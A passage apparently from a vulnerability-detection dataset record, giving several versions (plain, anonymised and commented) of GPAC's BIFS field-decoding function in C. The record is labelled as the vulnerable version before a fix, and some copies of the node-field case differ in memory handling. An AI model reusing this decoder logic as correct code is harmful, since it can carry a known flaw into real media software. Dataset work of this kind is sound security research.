((SFRotation *)field->far_ptr)->x = BD_ReadSFFloat(codec, bs);
((SFRotation *)field->far_ptr)->y = BD_ReadSFFloat(codec, bs);
((SFRotation *)field->far_ptr)->z = BD_ReadSFFloat(codec, bs);
((SFRotation *)field->far_ptr)->q = BD_ReadSFFloat(codec, bs);
break;
case GF_SG_VRML_SFSTRING:
size = gf_bs_read_int(bs, 5);
length = gf_bs_read_int(bs, size);
if (gf_bs_available(bs) < length) return GF_NON_COMPLIANT_BITSTREAM;
if (node && (node->sgprivate->tag==TAG_MPEG4_CacheTexture) && (field->fieldIndex<=2)) {
M_CacheTexture *ct = (M_CacheTexture *) node;
ct->data_len = length;
if (ct->data) gf_free(ct->data);
ct->data = (u8*)gf_malloc(sizeof(char)*length);
gf_bs_read_data(bs, (char*)ct->data, length);
} else if (node && (node->sgprivate->tag==TAG_MPEG4_BitWrapper) ) {
M_BitWrapper *bw = (M_BitWrapper*) node;
if (bw->buffer.buffer) gf_free(bw->buffer.buffer);
bw->buffer_len = length;
bw->buffer.buffer = (char*)gf_malloc(sizeof(char)*length);
gf_bs_read_data(bs, (char*)bw->buffer.buffer, length);
} else {
if ( ((SFString *)field->far_ptr)->buffer ) gf_free( ((SFString *)field->far_ptr)->buffer);
((SFString *)field->far_ptr)->buffer = (char *)gf_malloc(sizeof(char)*(length+1));
memset(((SFString *)field->far_ptr)->buffer , 0, length+1);
for (i=0; i<length; i++) {
((SFString *)field->far_ptr)->buffer[i] = gf_bs_read_int(bs, 8);
}
}
break;
case GF_SG_VRML_SFURL:
{
SFURL *url = (SFURL *) field->far_ptr;
size = gf_bs_read_int(bs, 1);
if (size) {
if (url->url) gf_free(url->url );
url->url = NULL;
length = gf_bs_read_int(bs, 10);
url->OD_ID = length;
} else {
if ( url->OD_ID ) url->OD_ID = (u32) -1;
size = gf_bs_read_int(bs, 5);
length = gf_bs_read_int(bs, size);
if (gf_bs_available(bs) < length) return GF_NON_COMPLIANT_BITSTREAM;
buffer = NULL;
if (length) {
buffer = (char *)gf_malloc(sizeof(char)*(length+1));
memset(buffer, 0, length+1);
for (i=0; i<length; i++) buffer[i] = gf_bs_read_int(bs, 8);
}
if (url->url) gf_free( url->url);
if (buffer && strlen(buffer)) {
url->url = buffer;
} else {
gf_free(buffer);
url->url = NULL;
}
}
}
break;
case GF_SG_VRML_SFIMAGE:
if (((SFImage *)field->far_ptr)->pixels) gf_free(((SFImage *)field->far_ptr)->pixels);
w = gf_bs_read_int(bs, 12);
h = gf_bs_read_int(bs, 12);
length = gf_bs_read_int(bs, 2);
if (length > 3) length = 3;
length += 1;
size = w * h * length;
if (gf_bs_available(bs) < size) return GF_NON_COMPLIANT_BITSTREAM;
((SFImage *)field->far_ptr)->width = w;
((SFImage *)field->far_ptr)->height = h;
((SFImage *)field->far_ptr)->numComponents = length;
((SFImage *)field->far_ptr)->pixels = (unsigned char *)gf_malloc(sizeof(char)*size);
for (i=0; i<size; i++) {
((SFImage *)field->far_ptr)->pixels[i] = gf_bs_read_int(bs, 8);
}
break;
case GF_SG_VRML_SFCOMMANDBUFFER:
{
SFCommandBuffer *sfcb = (SFCommandBuffer *)field->far_ptr;
if (!node) return GF_BAD_PARAM;
if (sfcb->buffer) {
gf_free(sfcb->buffer);
sfcb->buffer = NULL;
}
while (gf_list_count(sfcb->commandList)) {
GF_Command *com = (GF_Command*)gf_list_get(sfcb->commandList, 0);
gf_list_rem(sfcb->commandList, 0);
gf_sg_command_del(com);
}
size = gf_bs_read_int(bs, 5);
length = gf_bs_read_int(bs, size);
if (gf_bs_available(bs) < length) return GF_NON_COMPLIANT_BITSTREAM;
sfcb->bufferSize = length;
if (length) {
sfcb->buffer = (unsigned char *)gf_malloc(sizeof(char)*(length));
for (i=0; i<length; i++) {
sfcb->buffer[i] = gf_bs_read_int(bs, 8);
}
}
SFCommandBufferChanged(codec, node);
if (codec->dec_memory_mode || (node->sgprivate->tag==TAG_MPEG4_InputSensor)) {
CommandBufferItem *cbi = (CommandBufferItem *)gf_malloc(sizeof(CommandBufferItem));
cbi->node = node;
cbi->cb = sfcb;
gf_list_add(codec->command_buffers, cbi);
}
}
break;
case GF_SG_VRML_SFNODE:
new_node = gf_bifs_dec_node(codec, bs, field->NDTtype);
if (new_node) {
e = gf_node_register(new_node, is_mem_com ? NULL : node);
if (e) return e;
}
*((GF_Node **) field->far_ptr) = new_node;
break;
case GF_SG_VRML_SFSCRIPT:
#ifdef GPAC_HAS_QJS
codec->LastError = node ? SFScript_Parse(codec, (SFScript*)field->far_ptr, bs, node) : GF_NON_COMPLIANT_BITSTREAM;
#else
return GF_NOT_SUPPORTED;
#endif
break;
case GF_SG_VRML_SFATTRREF:
{
SFAttrRef *ar = (SFAttrRef *)field->far_ptr;
u32 nodeID = 1 + gf_bs_read_int(bs, codec->info->config.NodeIDBits);
ar->node = gf_sg_find_node(codec->current_graph, nodeID);
if (!ar->node) {
} else {
u32 nbBitsDEF = gf_get_bit_size(gf_node_get_num_fields_in_mode(ar->node, GF_SG_FIELD_CODING_DEF) - 1);
u32 field_ref = gf_bs_read_int(bs, nbBitsDEF);
codec->LastError = gf_bifs_get_field_index(ar->node, field_ref, GF_SG_FIELD_CODING_DEF, &ar->fieldIndex);
}
}
break;
default:
return GF_NON_COMPLIANT_BITSTREAM;
}
return codec->LastError;
}","GF_Err gf_bifs_dec_sf_field(GF_BifsDecoder * VAR_0, GF_BitStream *VAR_1, GF_Node *VAR_2, GF_FieldInfo *VAR_3, Bool VAR_4)
{
GF_Err VAR_5;
GF_Node *VAR_6;
u32 VAR_7, VAR_8, VAR_9, VAR_10, VAR_11;
char *VAR_12;
if (VAR_0->ActiveQP && VAR_2) {
VAR_5 = gf_bifs_dec_unquant_field(VAR_0, VAR_1, VAR_2, VAR_3);
if (VAR_5 != VAR_13) return VAR_5;
}
switch (VAR_3->fieldType) {
case VAR_14:
* ((SFBool *) VAR_3->far_ptr) = (SFBool) gf_bs_read_int(VAR_1, 1);
break;
case VAR_15:
((SFColor *)VAR_3->far_ptr)->red = BD_ReadSFFloat(VAR_0, VAR_1);
((SFColor *)VAR_3->far_ptr)->green = BD_ReadSFFloat(VAR_0, VAR_1);
((SFColor *)VAR_3->far_ptr)->blue = BD_ReadSFFloat(VAR_0, VAR_1);
break;
case VAR_16:
*((SFFloat *)VAR_3->far_ptr) = BD_ReadSFFloat(VAR_0, VAR_1);
break;
case VAR_17:
*((SFInt32 *)VAR_3->far_ptr) = (s32) gf_bs_read_int(VAR_1, 32);
break;
case VAR_18:
*((SFTime *)VAR_3->far_ptr) = gf_bs_read_double(VAR_1);
if (VAR_2) BD_CheckSFTimeOffset(VAR_0, VAR_2, VAR_3);
break;
case VAR_19:
((SFVec2f *)VAR_3->far_ptr)->x = BD_ReadSFFloat(VAR_0, VAR_1);
((SFVec2f *)VAR_3->far_ptr)->y = BD_ReadSFFloat(VAR_0, VAR_1);
break;
case VAR_20:
((SFVec3f *)VAR_3->far_ptr)->x = BD_ReadSFFloat(VAR_0, VAR_1);
((SFVec3f *)VAR_3->far_ptr)->y = BD_ReadSFFloat(VAR_0, VAR_1);
((SFVec3f *)VAR_3->far_ptr)->z = BD_ReadSFFloat(VAR_0, VAR_1);
break;
case VAR_21:
((SFRotation *)VAR_3->far_ptr)->x = BD_ReadSFFloat(VAR_0, VAR_1);
((SFRotation *)VAR_3->far_ptr)->y = BD_ReadSFFloat(VAR_0, VAR_1);
((SFRotation *)VAR_3->far_ptr)->z = BD_ReadSFFloat(VAR_0, VAR_1);
((SFRotation *)VAR_3->far_ptr)->q = BD_ReadSFFloat(VAR_0, VAR_1);
break;
case VAR_22:
VAR_7 = gf_bs_read_int(VAR_1, 5);
VAR_8 = gf_bs_read_int(VAR_1, VAR_7);
if (gf_bs_available(VAR_1) < VAR_8) return VAR_23;
if (VAR_2 && (VAR_2->sgprivate->tag==VAR_24) && (VAR_3->fieldIndex<=2)) {
M_CacheTexture *VAR_25 = (M_CacheTexture *) VAR_2;
VAR_25->data_len = VAR_8;
if (VAR_25->data) gf_free(VAR_25->data);
VAR_25->data = (u8*)gf_malloc(sizeof(char)*VAR_8);
gf_bs_read_data(VAR_1, (char*)VAR_25->data, VAR_8);
} else if (VAR_2 && (VAR_2->sgprivate->tag==VAR_26) ) {
M_BitWrapper *VAR_27 = (M_BitWrapper*) VAR_2;
if (VAR_27->buffer.buffer) gf_free(VAR_27->buffer.buffer);
VAR_27->buffer_len = VAR_8;
VAR_27->buffer.buffer = (char*)gf_malloc(sizeof(char)*VAR_8);
gf_bs_read_data(VAR_1, (char*)VAR_27->buffer.buffer, VAR_8);
} else {
if ( ((SFString *)VAR_3->far_ptr)->buffer ) gf_free( ((SFString *)VAR_3->far_ptr)->buffer);
((SFString *)VAR_3->far_ptr)->buffer = (char *)gf_malloc(sizeof(char)*(VAR_8+1));
memset(((SFString *)VAR_3->far_ptr)->buffer , 0, VAR_8+1);
for (VAR_11=0; VAR_11<VAR_8; VAR_11++) {
((SFString *)VAR_3->far_ptr)->buffer[VAR_11] = gf_bs_read_int(VAR_1, 8);
}
}
break;
case VAR_28:
{
SFURL *VAR_29 = (SFURL *) VAR_3->far_ptr;
VAR_7 = gf_bs_read_int(VAR_1, 1);
if (VAR_7) {
if (VAR_29->url) gf_free(VAR_29->url );
VAR_29->url = NULL;
VAR_8 = gf_bs_read_int(VAR_1, 10);
VAR_29->OD_ID = VAR_8;
} else {
if ( VAR_29->OD_ID ) VAR_29->OD_ID = (u32) -1;
VAR_7 = gf_bs_read_int(VAR_1, 5);
VAR_8 = gf_bs_read_int(VAR_1, VAR_7);
if (gf_bs_available(VAR_1) < VAR_8) return VAR_23;
VAR_12 = NULL;
if (VAR_8) {
VAR_12 = (char *)gf_malloc(sizeof(char)*(VAR_8+1));
memset(VAR_12, 0, VAR_8+1);
for (VAR_11=0; VAR_11<VAR_8; VAR_11++) VAR_12[VAR_11] = gf_bs_read_int(VAR_1, 8);
}
if (VAR_29->url) gf_free( VAR_29->url);
if (VAR_12 && strlen(VAR_12)) {
VAR_29->url = VAR_12;
} else {
gf_free(VAR_12);
VAR_29->url = NULL;
}
}
}
break;
case VAR_30:
if (((SFImage *)VAR_3->far_ptr)->pixels) gf_free(((SFImage *)VAR_3->far_ptr)->pixels);
VAR_9 = gf_bs_read_int(VAR_1, 12);
VAR_10 = gf_bs_read_int(VAR_1, 12);
VAR_8 = gf_bs_read_int(VAR_1, 2);
if (VAR_8 > 3) VAR_8 = 3;
VAR_8 += 1;
VAR_7 = VAR_9 * VAR_10 * VAR_8;
if (gf_bs_available(VAR_1) < VAR_7) return VAR_23;
((SFImage *)VAR_3->far_ptr)->width = VAR_9;
((SFImage *)VAR_3->far_ptr)->height = VAR_10;
((SFImage *)VAR_3->far_ptr)->numComponents = VAR_8;
((SFImage *)VAR_3->far_ptr)->pixels = (unsigned char *)gf_malloc(sizeof(char)*VAR_7);
for (VAR_11=0; VAR_11<VAR_7; VAR_11++) {
((SFImage *)VAR_3->far_ptr)->pixels[VAR_11] = gf_bs_read_int(VAR_1, 8);
}
break;
case VAR_31:
{
SFCommandBuffer *VAR_32 = (SFCommandBuffer *)VAR_3->far_ptr;
if (!VAR_2) return VAR_33;
if (VAR_32->buffer) {
gf_free(VAR_32->buffer);
VAR_32->buffer = NULL;
}
while (gf_list_count(VAR_32->commandList)) {
GF_Command *VAR_34 = (GF_Command*)gf_list_get(VAR_32->commandList, 0);
gf_list_rem(VAR_32->commandList, 0);
gf_sg_command_del(VAR_34);
}
VAR_7 = gf_bs_read_int(VAR_1, 5);
VAR_8 = gf_bs_read_int(VAR_1, VAR_7);
if (gf_bs_available(VAR_1) < VAR_8) return VAR_23;
VAR_32->bufferSize = VAR_8;
if (VAR_8) {
VAR_32->buffer = (unsigned char *)gf_malloc(sizeof(char)*(VAR_8));
for (VAR_11=0; VAR_11<VAR_8; VAR_11++) {
VAR_32->buffer[VAR_11] = gf_bs_read_int(VAR_1, 8);
}
}
SFCommandBufferChanged(VAR_0, VAR_2);
if (VAR_0->dec_memory_mode || (VAR_2->sgprivate->tag==VAR_35)) {
CommandBufferItem *VAR_36 = (CommandBufferItem *)gf_malloc(sizeof(CommandBufferItem));
VAR_36->node = VAR_2;
VAR_36->cb = VAR_32;
gf_list_add(VAR_0->command_buffers, VAR_36);
}
}
break;
case VAR_37:
VAR_6 = gf_bifs_dec_node(VAR_0, VAR_1, VAR_3->NDTtype);
if (VAR_6) {
VAR_5 = gf_node_register(VAR_6, VAR_4 ? NULL : VAR_2);
if (VAR_5) return VAR_5;
}
*((GF_Node **) VAR_3->far_ptr) = VAR_6;
break;
case VAR_38:
#ifdef VAR_39
VAR_0->LastError = VAR_2 ? SFScript_Parse(VAR_0, (SFScript*)VAR_3->far_ptr, VAR_1, VAR_2) : VAR_23;
#else
return VAR_40;
#endif
break;
case VAR_41:
{
SFAttrRef *VAR_42 = (SFAttrRef *)VAR_3->far_ptr;
u32 VAR_43 = 1 + gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
VAR_42->node = gf_sg_find_node(VAR_0->current_graph, VAR_43);
if (!VAR_42->node) {
} else {
u32 VAR_44 = gf_get_bit_size(gf_node_get_num_fields_in_mode(VAR_42->node, VAR_45) - 1);
u32 VAR_46 = gf_bs_read_int(VAR_1, VAR_44);
VAR_0->LastError = gf_bifs_get_field_index(VAR_42->node, VAR_46, VAR_45, &VAR_42->fieldIndex);
}
}
break;
default:
return VAR_23;
}
return VAR_0->LastError;
}",gpac/d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec/field_decode.c/vul/before/0.json,"GF_Err gf_bifs_dec_sf_field(GF_BifsDecoder * codec, GF_BitStream *bs, GF_Node *node, GF_FieldInfo *field, Bool is_mem_com)
{
	GF_Err e;
	GF_Node *new_node;
	u32 size, length, w, h, i;
	char *buffer;

	//blindly call unquantize. return is OK, error or GF_EOS
	if (codec->ActiveQP && node) {
		e = gf_bifs_dec_unquant_field(codec, bs, node, field);
		if (e != GF_EOS) return e;
	}
	//not quantized, use normal scheme
	switch (field->fieldType) {
	case GF_SG_VRML_SFBOOL:
		* ((SFBool *) field->far_ptr) = (SFBool) gf_bs_read_int(bs, 1);
		break;
	case GF_SG_VRML_SFCOLOR:
		((SFColor *)field->far_ptr)->red = BD_ReadSFFloat(codec, bs);
		((SFColor *)field->far_ptr)->green = BD_ReadSFFloat(codec, bs);
		((SFColor *)field->far_ptr)->blue = BD_ReadSFFloat(codec, bs);
		break;
	case GF_SG_VRML_SFFLOAT:
		*((SFFloat *)field->far_ptr) = BD_ReadSFFloat(codec, bs);
		break;
	case GF_SG_VRML_SFINT32:
		*((SFInt32 *)field->far_ptr) = (s32) gf_bs_read_int(bs, 32);
		break;
	case GF_SG_VRML_SFTIME:
		*((SFTime *)field->far_ptr) = gf_bs_read_double(bs);
		if (node) BD_CheckSFTimeOffset(codec, node, field);
		break;
	case GF_SG_VRML_SFVEC2F:
		((SFVec2f *)field->far_ptr)->x = BD_ReadSFFloat(codec, bs);
		((SFVec2f *)field->far_ptr)->y = BD_ReadSFFloat(codec, bs);
		break;
	case GF_SG_VRML_SFVEC3F:
		((SFVec3f *)field->far_ptr)->x = BD_ReadSFFloat(codec, bs);
		((SFVec3f *)field->far_ptr)->y = BD_ReadSFFloat(codec, bs);
		((SFVec3f *)field->far_ptr)->z = BD_ReadSFFloat(codec, bs);
		break;
	case GF_SG_VRML_SFROTATION:
		((SFRotation *)field->far_ptr)->x = BD_ReadSFFloat(codec, bs);
		((SFRotation *)field->far_ptr)->y = BD_ReadSFFloat(codec, bs);
		((SFRotation *)field->far_ptr)->z = BD_ReadSFFloat(codec, bs);
		((SFRotation *)field->far_ptr)->q = BD_ReadSFFloat(codec, bs);
		break;
	case GF_SG_VRML_SFSTRING:
		size = gf_bs_read_int(bs, 5);
		length = gf_bs_read_int(bs, size);
		if (gf_bs_available(bs) < length) return GF_NON_COMPLIANT_BITSTREAM;

		if (node && (node->sgprivate->tag==TAG_MPEG4_CacheTexture) && (field->fieldIndex<=2)) {
			M_CacheTexture *ct = (M_CacheTexture *) node;
			ct->data_len = length;
			if (ct->data) gf_free(ct->data);
			ct->data = (u8*)gf_malloc(sizeof(char)*length);
			gf_bs_read_data(bs, (char*)ct->data, length);
		} else if (node && (node->sgprivate->tag==TAG_MPEG4_BitWrapper) ) {
			M_BitWrapper *bw = (M_BitWrapper*) node;
			if (bw->buffer.buffer) gf_free(bw->buffer.buffer);
			bw->buffer_len = length;
			bw->buffer.buffer = (char*)gf_malloc(sizeof(char)*length);
			gf_bs_read_data(bs, (char*)bw->buffer.buffer, length);
		} else {
			if ( ((SFString *)field->far_ptr)->buffer ) gf_free( ((SFString *)field->far_ptr)->buffer);
			((SFString *)field->far_ptr)->buffer = (char *)gf_malloc(sizeof(char)*(length+1));
			memset(((SFString *)field->far_ptr)->buffer , 0, length+1);
			for (i=0; i<length; i++) {
				((SFString *)field->far_ptr)->buffer[i] = gf_bs_read_int(bs, 8);
			}
		}
		break;
	case GF_SG_VRML_SFURL:
	{
		SFURL *url = (SFURL *) field->far_ptr;
		size = gf_bs_read_int(bs, 1);
		if (size) {
			if (url->url) gf_free(url->url );
			url->url = NULL;
			length = gf_bs_read_int(bs, 10);
			url->OD_ID = length;
		} else {
			if ( url->OD_ID ) url->OD_ID = (u32) -1;
			size = gf_bs_read_int(bs, 5);
			length = gf_bs_read_int(bs, size);
			if (gf_bs_available(bs) < length) return GF_NON_COMPLIANT_BITSTREAM;
			buffer = NULL;
			if (length) {
				buffer = (char *)gf_malloc(sizeof(char)*(length+1));
				memset(buffer, 0, length+1);
				for (i=0; i<length; i++) buffer[i] = gf_bs_read_int(bs, 8);
			}
			if (url->url) gf_free( url->url);
			/*if URL is empty set it to NULL*/
			if (buffer && strlen(buffer)) {
				url->url = buffer;
			} else {
				gf_free(buffer);
				url->url = NULL;
			}
		}
	}
	break;
	case GF_SG_VRML_SFIMAGE:
		if (((SFImage *)field->far_ptr)->pixels) gf_free(((SFImage *)field->far_ptr)->pixels);
		w = gf_bs_read_int(bs, 12);
		h = gf_bs_read_int(bs, 12);
		length = gf_bs_read_int(bs, 2);

		if (length > 3) length = 3;
		length += 1;
		size = w * h * length;
		if (gf_bs_available(bs) < size) return GF_NON_COMPLIANT_BITSTREAM;
		((SFImage *)field->far_ptr)->width = w;
		((SFImage *)field->far_ptr)->height = h;
		((SFImage *)field->far_ptr)->numComponents = length;
		((SFImage *)field->far_ptr)->pixels = (unsigned char *)gf_malloc(sizeof(char)*size);
		//WARNING: Buffers are NOT ALIGNED IN THE BITSTREAM
		for (i=0; i<size; i++) {
			((SFImage *)field->far_ptr)->pixels[i] = gf_bs_read_int(bs, 8);
		}
		break;
	case GF_SG_VRML_SFCOMMANDBUFFER:
	{
		SFCommandBuffer *sfcb = (SFCommandBuffer *)field->far_ptr;
		if (!node) return GF_BAD_PARAM;
		if (sfcb->buffer) {
			gf_free(sfcb->buffer);
			sfcb->buffer = NULL;
		}
		while (gf_list_count(sfcb->commandList)) {
			GF_Command *com = (GF_Command*)gf_list_get(sfcb->commandList, 0);
			gf_list_rem(sfcb->commandList, 0);
			gf_sg_command_del(com);
		}

		size = gf_bs_read_int(bs, 5);
		length = gf_bs_read_int(bs, size);
		if (gf_bs_available(bs) < length) return GF_NON_COMPLIANT_BITSTREAM;

		sfcb->bufferSize = length;
		if (length) {
			sfcb->buffer = (unsigned char *)gf_malloc(sizeof(char)*(length));
			//WARNING Buffers are NOT ALIGNED IN THE BITSTREAM
			for (i=0; i<length; i++) {
				sfcb->buffer[i] = gf_bs_read_int(bs, 8);
			}
		}
		//notify the node - this is needed in case an enhencement layer replaces the buffer, in which case
		//the # ID Bits may change
		SFCommandBufferChanged(codec, node);

		/*
		 1 - memory mode, register command buffer for later parsing
		 2 - InputSensor only works on decompressed commands
		*/
		if (codec->dec_memory_mode || (node->sgprivate->tag==TAG_MPEG4_InputSensor)) {
			CommandBufferItem *cbi = (CommandBufferItem *)gf_malloc(sizeof(CommandBufferItem));
			cbi->node = node;
			cbi->cb = sfcb;
			gf_list_add(codec->command_buffers, cbi);
		}
	}
	break;
	case GF_SG_VRML_SFNODE:
		//if not memory dec mode, unregister previous node
		//otherwise the field points to the memory command internal field
		if (!is_mem_com) {
			if ( *((GF_Node **) field->far_ptr) != NULL) {
				gf_node_unregister(*((GF_Node **) field->far_ptr), node);
				 *((GF_Node **) field->far_ptr) = NULL;
			}
		}
		//for nodes the field ptr is a ptr to the field, which is a node ptr ;)
		new_node = gf_bifs_dec_node(codec, bs, field->NDTtype);
		if (new_node) {
			e = gf_node_register(new_node, is_mem_com ? NULL : node);
			if (e) return e;
		}
		//it may happen that new_node is NULL (this is valid for a proto declaration)
		*((GF_Node **) field->far_ptr) = new_node;
		break;
	case GF_SG_VRML_SFSCRIPT:
#ifdef GPAC_HAS_QJS
		codec->LastError = node ? SFScript_Parse(codec, (SFScript*)field->far_ptr, bs, node) : GF_NON_COMPLIANT_BITSTREAM;
#else
		return GF_NOT_SUPPORTED;
#endif
		break;
	case GF_SG_VRML_SFATTRREF:
	{
		SFAttrRef *ar = (SFAttrRef *)field->far_ptr;
		u32 nodeID = 1 + gf_bs_read_int(bs, codec->info->config.NodeIDBits);
		ar->node = gf_sg_find_node(codec->current_graph, nodeID);
		if (!ar->node) {

		} else {
			u32 nbBitsDEF = gf_get_bit_size(gf_node_get_num_fields_in_mode(ar->node, GF_SG_FIELD_CODING_DEF) - 1);
			u32 field_ref = gf_bs_read_int(bs, nbBitsDEF);
			codec->LastError = gf_bifs_get_field_index(ar->node, field_ref, GF_SG_FIELD_CODING_DEF, &ar->fieldIndex);
		}
	}
	break;
	default:
		return GF_NON_COMPLIANT_BITSTREAM;
	}
	return codec->LastError;
}","GF_Err gf_bifs_dec_sf_field(GF_BifsDecoder * VAR_0, GF_BitStream *VAR_1, GF_Node *VAR_2, GF_FieldInfo *VAR_3, Bool VAR_4)
{
	GF_Err VAR_5;
	GF_Node *VAR_6;
	u32 VAR_7, VAR_8, VAR_9, VAR_10, VAR_11;
	char *VAR_12;

	/* COMMENT_0 */
	if (VAR_0->ActiveQP && VAR_2) {
		VAR_5 = gf_bifs_dec_unquant_field(VAR_0, VAR_1, VAR_2, VAR_3);
		if (VAR_5 != VAR_13) return VAR_5;
	}
	/* COMMENT_1 */
	switch (VAR_3->fieldType) {
	case VAR_14:
		* ((SFBool *) VAR_3->far_ptr) = (SFBool) gf_bs_read_int(VAR_1, 1);
		break;
	case VAR_15:
		((SFColor *)VAR_3->far_ptr)->red = BD_ReadSFFloat(VAR_0, VAR_1);
		((SFColor *)VAR_3->far_ptr)->green = BD_ReadSFFloat(VAR_0, VAR_1);
		((SFColor *)VAR_3->far_ptr)->blue = BD_ReadSFFloat(VAR_0, VAR_1);
		break;
	case VAR_16:
		*((SFFloat *)VAR_3->far_ptr) = BD_ReadSFFloat(VAR_0, VAR_1);
		break;
	case VAR_17:
		*((SFInt32 *)VAR_3->far_ptr) = (s32) gf_bs_read_int(VAR_1, 32);
		break;
	case VAR_18:
		*((SFTime *)VAR_3->far_ptr) = gf_bs_read_double(VAR_1);
		if (VAR_2) BD_CheckSFTimeOffset(VAR_0, VAR_2, VAR_3);
		break;
	case VAR_19:
		((SFVec2f *)VAR_3->far_ptr)->x = BD_ReadSFFloat(VAR_0, VAR_1);
		((SFVec2f *)VAR_3->far_ptr)->y = BD_ReadSFFloat(VAR_0, VAR_1);
		break;
	case VAR_20:
		((SFVec3f *)VAR_3->far_ptr)->x = BD_ReadSFFloat(VAR_0, VAR_1);
		((SFVec3f *)VAR_3->far_ptr)->y = BD_ReadSFFloat(VAR_0, VAR_1);
		((SFVec3f *)VAR_3->far_ptr)->z = BD_ReadSFFloat(VAR_0, VAR_1);
		break;
	case VAR_21:
		((SFRotation *)VAR_3->far_ptr)->x = BD_ReadSFFloat(VAR_0, VAR_1);
		((SFRotation *)VAR_3->far_ptr)->y = BD_ReadSFFloat(VAR_0, VAR_1);
		((SFRotation *)VAR_3->far_ptr)->z = BD_ReadSFFloat(VAR_0, VAR_1);
		((SFRotation *)VAR_3->far_ptr)->q = BD_ReadSFFloat(VAR_0, VAR_1);
		break;
	case VAR_22:
		VAR_7 = gf_bs_read_int(VAR_1, 5);
		VAR_8 = gf_bs_read_int(VAR_1, VAR_7);
		if (gf_bs_available(VAR_1) < VAR_8) return VAR_23;

		if (VAR_2 && (VAR_2->sgprivate->tag==VAR_24) && (VAR_3->fieldIndex<=2)) {
			M_CacheTexture *VAR_25 = (M_CacheTexture *) VAR_2;
			VAR_25->data_len = VAR_8;
			if (VAR_25->data) gf_free(VAR_25->data);
			VAR_25->data = (u8*)gf_malloc(sizeof(char)*VAR_8);
			gf_bs_read_data(VAR_1, (char*)VAR_25->data, VAR_8);
		} else if (VAR_2 && (VAR_2->sgprivate->tag==VAR_26) ) {
			M_BitWrapper *VAR_27 = (M_BitWrapper*) VAR_2;
			if (VAR_27->buffer.buffer) gf_free(VAR_27->buffer.buffer);
			VAR_27->buffer_len = VAR_8;
			VAR_27->buffer.buffer = (char*)gf_malloc(sizeof(char)*VAR_8);
			gf_bs_read_data(VAR_1, (char*)VAR_27->buffer.buffer, VAR_8);
		} else {
			if ( ((SFString *)VAR_3->far_ptr)->buffer ) gf_free( ((SFString *)VAR_3->far_ptr)->buffer);
			((SFString *)VAR_3->far_ptr)->buffer = (char *)gf_malloc(sizeof(char)*(VAR_8+1));
			memset(((SFString *)VAR_3->far_ptr)->buffer , 0, VAR_8+1);
			for (VAR_11=0; VAR_11<VAR_8; VAR_11++) {
				((SFString *)VAR_3->far_ptr)->buffer[VAR_11] = gf_bs_read_int(VAR_1, 8);
			}
		}
		break;
	case VAR_28:
	{
		SFURL *VAR_29 = (SFURL *) VAR_3->far_ptr;
		VAR_7 = gf_bs_read_int(VAR_1, 1);
		if (VAR_7) {
			if (VAR_29->url) gf_free(VAR_29->url );
			VAR_29->url = NULL;
			VAR_8 = gf_bs_read_int(VAR_1, 10);
			VAR_29->OD_ID = VAR_8;
		} else {
			if ( VAR_29->OD_ID ) VAR_29->OD_ID = (u32) -1;
			VAR_7 = gf_bs_read_int(VAR_1, 5);
			VAR_8 = gf_bs_read_int(VAR_1, VAR_7);
			if (gf_bs_available(VAR_1) < VAR_8) return VAR_23;
			VAR_12 = NULL;
			if (VAR_8) {
				VAR_12 = (char *)gf_malloc(sizeof(char)*(VAR_8+1));
				memset(VAR_12, 0, VAR_8+1);
				for (VAR_11=0; VAR_11<VAR_8; VAR_11++) VAR_12[VAR_11] = gf_bs_read_int(VAR_1, 8);
			}
			if (VAR_29->url) gf_free( VAR_29->url);
			/* COMMENT_2 */
			if (VAR_12 && strlen(VAR_12)) {
				VAR_29->url = VAR_12;
			} else {
				gf_free(VAR_12);
				VAR_29->url = NULL;
			}
		}
	}
	break;
	case VAR_30:
		if (((SFImage *)VAR_3->far_ptr)->pixels) gf_free(((SFImage *)VAR_3->far_ptr)->pixels);
		VAR_9 = gf_bs_read_int(VAR_1, 12);
		VAR_10 = gf_bs_read_int(VAR_1, 12);
		VAR_8 = gf_bs_read_int(VAR_1, 2);

		if (VAR_8 > 3) VAR_8 = 3;
		VAR_8 += 1;
		VAR_7 = VAR_9 * VAR_10 * VAR_8;
		if (gf_bs_available(VAR_1) < VAR_7) return VAR_23;
		((SFImage *)VAR_3->far_ptr)->width = VAR_9;
		((SFImage *)VAR_3->far_ptr)->height = VAR_10;
		((SFImage *)VAR_3->far_ptr)->numComponents = VAR_8;
		((SFImage *)VAR_3->far_ptr)->pixels = (unsigned char *)gf_malloc(sizeof(char)*VAR_7);
		/* COMMENT_3 */
		for (VAR_11=0; VAR_11<VAR_7; VAR_11++) {
			((SFImage *)VAR_3->far_ptr)->pixels[VAR_11] = gf_bs_read_int(VAR_1, 8);
		}
		break;
	case VAR_31:
	{
		SFCommandBuffer *VAR_32 = (SFCommandBuffer *)VAR_3->far_ptr;
		if (!VAR_2) return VAR_33;
		if (VAR_32->buffer) {
			gf_free(VAR_32->buffer);
			VAR_32->buffer = NULL;
		}
		while (gf_list_count(VAR_32->commandList)) {
			GF_Command *VAR_34 = (GF_Command*)gf_list_get(VAR_32->commandList, 0);
			gf_list_rem(VAR_32->commandList, 0);
			gf_sg_command_del(VAR_34);
		}

		VAR_7 = gf_bs_read_int(VAR_1, 5);
		VAR_8 = gf_bs_read_int(VAR_1, VAR_7);
		if (gf_bs_available(VAR_1) < VAR_8) return VAR_23;

		VAR_32->bufferSize = VAR_8;
		if (VAR_8) {
			VAR_32->buffer = (unsigned char *)gf_malloc(sizeof(char)*(VAR_8));
			/* COMMENT_4 */
			for (VAR_11=0; VAR_11<VAR_8; VAR_11++) {
				VAR_32->buffer[VAR_11] = gf_bs_read_int(VAR_1, 8);
			}
		}
		/* COMMENT_5 */
		/* COMMENT_6 */
		SFCommandBufferChanged(VAR_0, VAR_2);

		/* COMMENT_7 */
                                                             
                                                      
    
		if (VAR_0->dec_memory_mode || (VAR_2->sgprivate->tag==VAR_35)) {
			CommandBufferItem *VAR_36 = (CommandBufferItem *)gf_malloc(sizeof(CommandBufferItem));
			VAR_36->node = VAR_2;
			VAR_36->cb = VAR_32;
			gf_list_add(VAR_0->command_buffers, VAR_36);
		}
	}
	break;
	case VAR_37:
		/* COMMENT_11 */
		/* COMMENT_12 */
		if (!VAR_4) {
			if ( *((GF_Node **) VAR_3->far_ptr) != NULL) {
				gf_node_unregister(*((GF_Node **) VAR_3->far_ptr), VAR_2);
				 *((GF_Node **) VAR_3->far_ptr) = NULL;
			}
		}
		/* COMMENT_13 */
